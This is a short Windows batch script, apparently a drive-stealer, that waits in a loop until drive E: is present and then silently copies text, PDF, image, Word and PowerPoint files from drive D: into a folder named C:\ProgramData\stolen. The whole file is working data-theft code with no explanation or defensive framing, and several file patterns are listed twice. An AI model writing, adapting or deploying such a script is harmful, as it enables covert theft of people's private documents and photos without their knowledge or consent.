@echo off
:repeat
timeout 10
IF NOT EXIST E:\nul GOTO repeat
xcopy "D:\*.txt*" "C:\ProgramData\stolen" /i /s
xcopy "D:\*.jpg*" "C:\ProgramData\stolen" /i /s
xcopy "D:\*.pdf*" "C:\ProgramData\stolen" /i /s
xcopy "D:\*.pptx*" "C:\ProgramData\stolen" /i /s
xcopy "D:\*.pptm*" "C:\ProgramData\stolen" /i /s
xcopy "D:\*.ppt*" "C:\ProgramData\stolen" /i /s
xcopy "D:\*.xps*" "C:\ProgramData\stolen" /i /s
xcopy "D:\*.potx*" "C:\ProgramData\stolen" /i /s
xcopy "D:\*.potm*" "C:\ProgramData\stolen" /i /s
xcopy "D:\*.pot*" "C:\ProgramData\stolen" /i /s
xcopy "D:\*.thmx*" "C:\ProgramData\stolen" /i /s
xcopy "D:\*.pps*" "C:\ProgramData\stolen" /i /s
xcopy "D:\*.ppsx*" "C:\ProgramData\stolen" /i /s
xcopy "D:\*.ppsm*" "C:\ProgramData\stolen" /i /s
xcopy "D:\*.ppt*" "C:\ProgramData\stolen" /i /s
xcopy "D:\*.ppam*" "C:\ProgramData\stolen" /i /s
xcopy "D:\*.ppa*" "C:\ProgramData\stolen" /i /s
xcopy "D:\*.tif*" "C:\ProgramData\stolen" /i /s
xcopy "D:\*.pptx*" "C:\ProgramData\stolen" /i /s
xcopy "D:\*.ppz*" "C:\ProgramData\stolen" /i /s
xcopy "D:\*.doc*" "C:\ProgramData\stolen" /i /s
xcopy "D:\*.docx*" "C:\ProgramData\stolen" /i /s
xcopy "D:\*.dotx*" "C:\ProgramData\stolen" /i /s
xcopy "D:\*.dot*" "C:\ProgramData\stolen" /i /s
pause

